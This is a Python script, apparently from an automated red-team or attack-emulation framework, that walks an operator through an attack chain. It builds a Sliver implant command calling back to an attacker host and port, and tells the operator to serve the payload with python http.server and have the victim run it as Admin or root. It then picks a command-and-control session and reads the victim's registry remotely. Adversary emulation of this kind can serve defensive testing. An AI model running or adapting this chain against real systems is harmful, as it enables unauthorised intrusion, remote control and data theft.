
import asyncio
import questionary
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)

    async def executor_sliver_implant_generation():
        console.print(
            "[bold deep_sky_blue4]Generating the command to create a Sliver payload...[/bold deep_sky_blue4]"
        )

        # collect user input
        protocol = await questionary.select(
            "Select protocol", choices=["mtls", "http", "https"]
        ).ask_async()
        lhost = await questionary.text(
            "Enter listening address",
            default="192.168.146.129",
        ).ask_async()
        lport = await questionary.text(
            "Enter listening port",
            default="9001",
            validate=lambda x: x.isdigit() and 1 <= int(x) <= 65535 if x else False,
        ).ask_async()
        os_type = await questionary.select(
            "Select target OS",
            choices=["windows", "linux", "macos"],
        ).ask_async()
        arch = await questionary.select(
            "Select architecture",
            choices=["64bit", "32bit"],
        ).ask_async()
        save_path = await questionary.text(
            "Save path", default="/home/user/Downloads"
        ).ask_async()
        command = f"sliver generate --{protocol} {lhost}:{lport} --os {os_type} --arch {arch} --save {save_path}"
        console.print(
            f"[bold violet]Step: Commands to Generate Sliver Implant[/]", justify="left"
        )
        console.print(
            "─" * min(50, len("Commands to Generate Sliver Implant") + 10),
            style="dim violet",
        )
        console.print(f"[bold deep_sky_blue4]Commands to execute:[/]", justify="left")
        console.print(f"  [dim cyan]└─>[/] [pale_green3]{command}[/]")

        confirmed = confirm_action()
        if not confirmed:
            console.print(
                "Step canceled. Please ensure you have completed the manual steps."
            )
            return
    await executor_sliver_implant_generation()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: hive[/]")
    console.print(f"  Description: Registry hive (HKLM/HKCU/HKU)")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for hive [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: hive")
    user_params["hive"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: reg_path[/]")
    console.print(f"  Description: Path to registry key")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for reg_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: reg_path")
    user_params["reg_path"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: key[/]")
    console.print(f"  Description: Specific value name to read")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for key [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: key")
    user_params["key"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: hostname[/]")
    console.print(f"  Description: Target hostname for remote registry access")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for hostname [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: hostname")
    user_params["hostname"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: registry_read[/]")
    confirm_action()
    try:
        await sliver_executor.registry_read(user_params["hive"], user_params["reg_path"], user_params["key"], user_params["hostname"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

if __name__ == "__main__":
    asyncio.run(main())
